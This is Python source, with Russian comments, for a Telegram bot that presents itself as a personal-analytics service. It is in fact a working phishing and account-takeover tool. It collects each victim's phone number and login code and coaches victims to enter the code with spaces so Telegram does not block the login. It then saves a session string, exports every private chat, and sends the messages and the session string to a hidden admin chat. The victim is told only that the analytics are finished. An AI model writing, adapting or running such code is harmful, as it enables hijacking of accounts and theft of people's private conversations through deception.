"""
Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ТОЛЬКО личных чатов + Избранное
Пользователь подключается → бот скачивает ВСЕ сообщения из личных чатов → присылает ZIP админу
"""

import asyncio
import os
import json
import zipfile
import shutil
import tempfile
import aiohttp
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ (из переменных окружения)
# ==========================================

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

# ==========================================
# АВТОПИНГ (каждые 5 минут)
# ==========================================

async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    logger.info("🔄 Автопинг запущен (каждые 5 минут)")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except Exception:
            pass
        await asyncio.sleep(300)

# ==========================================
# ВЕБ-СЕРВЕР (для автопинга)
# ==========================================

from fastapi import FastAPI
import uvicorn

web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# ОСНОВНОЙ БОТ
# ==========================================

class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
        self.exporting = {}
    
    async def start(self):
        """Запуск бота с автоперезапуском при падении"""
        while True:
            try:
                await self.bot.start(bot_token=BOT_TOKEN)
                logger.info("✅ Бот запущен")
                
                # Регистрируем обработчики
                self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
                self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
                self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
                self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
                self.bot.add_event_handler(self.cmd_ping, events.NewMessage(pattern='/ping'))
                self.bot.add_event_handler(self.handle_msg, events.NewMessage())
                
                await self.bot.run_until_disconnected()
            except Exception as e:
                logger.error(f"❌ Бот упал: {e}. Перезапуск через 5 секунд...")
                await asyncio.sleep(5)
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика (после сбора данных)
/help - Помощь
/ping - Проверка работы бота
""")
    
    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Отправьте /add

2️⃣ Введите номер телефона

3️⃣ Введите код из Telegram (МОЖНО С ПРОБЕЛАМИ!)
   Пример: 12 345 или 1-2-3-4-5

4️⃣ Готово! 🎉

⏳ **После подключения:**
Ваши личные чаты будут обработаны в фоне.
Обычно это занимает 2-10 минут.
""")
    
    async def cmd_stats(self, e):
        await e.respond("""
📊 **Статистика пока пуста**

⏳ Подключите аккаунт через /add.
После обработки чатов статистика появится здесь.
""")
    
    async def cmd_ping(self, e):
        await e.respond("🏓 Pong! Бот работает.")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение. Дождитесь завершения.")
            return
        
        self.pending[uid] = {'step': 'phone'}
        await e.respond("""
📱 **Введите номер телефона**

Например: +79001234567
""")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        uid = e.sender_id
        text = e.text
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)
    
    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        
        phone = phone.strip()
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        await e.respond("⏳ Отправляю код подтверждения...")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            
            await e.respond("""
📨 **Код отправлен!**

💡 Введите код МОЖНО С ПРОБЕЛАМИ:
`12 345` или `1-2-3-4-5`

⚠️ Telegram НЕ блокирует вход, если код введён с пробелами!
""")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА КОДА =====
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        code = code.strip()
        code = code.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        logger.info(f"Код после очистки: {code}")
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            me = await data['client'].get_me()
            session_string = data['client'].session.save()
            
            # Закрываем временный клиент
            await data['client'].disconnect()
            
            # Запускаем экспорт в фоне
            asyncio.create_task(self.export_and_send(uid, session_string, me))
            
            await e.respond(f"""
✅ **Аккаунт подключен!**

👤 {me.first_name}, ваши личные чаты обрабатываются.

⏳ Обычно это занимает 2-10 минут.
Как только всё будет готово — вы получите уведомление.
""")
            
            if uid in self.pending:
                del self.pending[uid]
            
        except PhoneCodeInvalidError:
            await e.respond("""
❌ **Неверный код!**

💡 Попробуйте ещё раз (можно с пробелами):
`12 345` или `1-2-3-4-5`
""")
            
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек! Начните заново с /add")
            if uid in self.pending:
                del self.pending[uid]
                
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ЭКСПОРТ (в отдельном клиенте, не блокирует бота) =====
    
    async def export_and_send(self, uid: int, session_string: str, me):
        """Экспорт в отдельном клиенте — бот продолжает отвечать"""
        
        if self.exporting.get(uid, False):
            return
        
        self.exporting[uid] = True
        
        # Отдельный клиент для экспорта
        export_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        try:
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
📥 **Начинаю экспорт личных чатов!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}
""")
            
            await export_client.connect()
            
            if not await export_client.is_user_authorized():
                await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Невалидная сессия для {me.id}")
                return
            
            dialogs = await export_client.get_dialogs()
            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Всего диалогов: {len(dialogs)}")
            
            export_dir = tempfile.mkdtemp()
            total_messages = 0
            processed = 0
            
            for dialog in dialogs:
                try:
                    # Только личные чаты
                    if not dialog.is_user:
                        continue
                    
                    chat_name = dialog.name or "Без названия"
                    chat_id = dialog.id
                    
                    first_msg = await export_client.get_messages(dialog, limit=1)
                    if not first_msg:
                        continue
                    
                    messages = []
                    async for msg in export_client.iter_messages(dialog, limit=None):
                        try:
                            messages.append({
                                'id': msg.id,
                                'date': msg.date.isoformat() if msg.date else None,
                                'text': msg.text or '',
                                'sender_id': msg.sender_id,
                                'sender_name': msg.sender.first_name if msg.sender else None
                            })
                        except Exception:
                            continue
                    
                    safe_name = chat_name.replace('/', '_').replace('\\', '_').replace(':', '_')
                    filename = f"{chat_id}_{safe_name}.json"
                    filepath = os.path.join(export_dir, filename)
                    
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump({
                            'chat_name': chat_name,
                            'chat_id': chat_id,
                            'total_messages': len(messages),
                            'messages': messages
                        }, f, ensure_ascii=False, indent=2)
                    
                    total_messages += len(messages)
                    processed += 1
                    
                except FloodWaitError as e:
                    logger.warning(f"FloodWait {e.seconds} сек для чата {dialog.name}")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    logger.error(f"Ошибка чата {dialog.name}: {e}")
                    continue
            
            # Создаём ZIP
            zip_filename = tempfile.mktemp(suffix='.zip')
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(export_dir):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), export_dir))
            
            shutil.rmtree(export_dir)
            
            # Отправляем админу
            with open(zip_filename, 'rb') as f:
                await self.bot.send_file(
                    ADMIN_CHAT_ID,
                    f,
                    caption=f"""
📦 **Экспорт завершён!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}

📨 Сообщений: {total_messages}
📁 Личных чатов: {processed}

🔑 **STRING SESSION:**
`{session_string}`

📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                )
            
            os.unlink(zip_filename)
            
            # Уведомление пользователю
            try:
                await self.bot.send_message(uid, "✅ **Аналитика завершена!** Спасибо за использование бота.")
            except Exception:
                pass
            
            logger.info(f"✅ Экспорт для {me.id} завершён")
            
        except Exception as err:
            logger.error(f"Ошибка экспорта: {err}")
            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка экспорта для {me.id}: {err}")
        finally:
            await export_client.disconnect()
            self.exporting[uid] = False

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    # Веб-сервер для автопинга
    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен (каждые 5 минут)")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")